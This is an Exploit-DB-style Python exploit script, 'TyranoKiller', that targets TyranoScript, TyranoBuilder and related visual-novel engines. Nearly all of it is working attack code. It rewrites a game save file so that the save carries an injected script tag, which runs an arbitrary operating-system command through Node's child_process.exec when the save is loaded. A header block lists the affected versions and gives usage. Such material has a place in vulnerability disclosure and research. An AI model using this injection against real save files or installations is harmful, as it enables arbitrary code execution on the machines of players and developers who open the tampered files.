# Exploit Title: TyranoScript 5.11d - Arbitrary Code Execution
# Date: 23/12/2021
# Exploit Author: Satoki
# Vendor Homepage: https://tyrano.jp/
# Software Link: https://github.com/ShikemokuMK/tyranoscript
#
# Version (Save Data ACR):
#    TyranoScriptV5 <= 5.04b
#    TyranoScript <= 4.83
#
# Version (Development Data ACE):
#    TyranoBuilder <= 1.87b
#    TyranoBuilderV5 <= 2.02
#    TyranoRider <= 2.20
#    TyranoStudio <= 1.10d
#    (TyranoScriptV5 <= 5.11d)
#    (TyranoScript <= 4.88)
#
# Tested on: Windows
# CVE : 0day
#
# GitHub: https://github.com/satoki/tyranokiller
# Usage: python3 tyranokiller.py -c "calc" Test.sav

import os
import sys
import shutil
from argparse import ArgumentParser

argparser = ArgumentParser()
argparser.add_argument("filename", type=str, help="Specify the target sav file name")
argparser.add_argument("-c", "--command", type=str, default="calc", help="Specify the command to be injected")
args = argparser.parse_args()

filename = args.filename
command = args.command

print(f"\033[91m\
-------------------------------------------------------------\n\
|  _____                                   _ _ _            |\n\
| /__   \_   _ _ __ __ _ _ __   ___   /\ /(_) | | ___ _ __  |\n\
|   / /\/ | | | '__/ _` | '_ \ / _ \ / //_/ | | |/ _ \ '__| |\n\
|  / /  | |_| | | | (_| | | | | (_) / __ \| | | |  __/ |    |\n\
|  \/    \__, |_|  \__,_|_| |_|\___/\/  \/|_|_|_|\___|_|    |\n\
|        |___/                                              |\n\
|                                                     v1.1.0|\n\
-------------------------------------------------------------\n\
CVE-XXXX-XXXX\033[0m\n\
Target: {filename}\n\
Command: {command}\n\
------------------------------------------------------------")

if not os.path.isfile(filename):
    print("Error: sav file doesn't exist.")
    sys.exit(1)

if "\"" in command:
    print("Error: Double quotes can't be used in the command.")
    sys.exit(1)

shutil.copyfile(filename, f"{filename}.bk")

savfile = open(f"{filename}.bk", mode="r")
data = savfile.read()
savfile.close()

command = command.replace("\\", "\\\\")
code = f"\
alert('Injected_by_TyranoKiller_!!!!');\
require('child_process').exec(`{command}`);\
"
data = data.replace("%3C/div%3E", f"%3C/div%3E%3Cscript%3E{code}%3C/script%3E", 1)

code = code.replace(";", ";\n")
print(f"Code:\n\033[96m{code}\033[0m\
------------------------------------------------------------")

savfile = open(filename, mode="w")
savfile.write(data)
savfile.close()

print("Completed.")
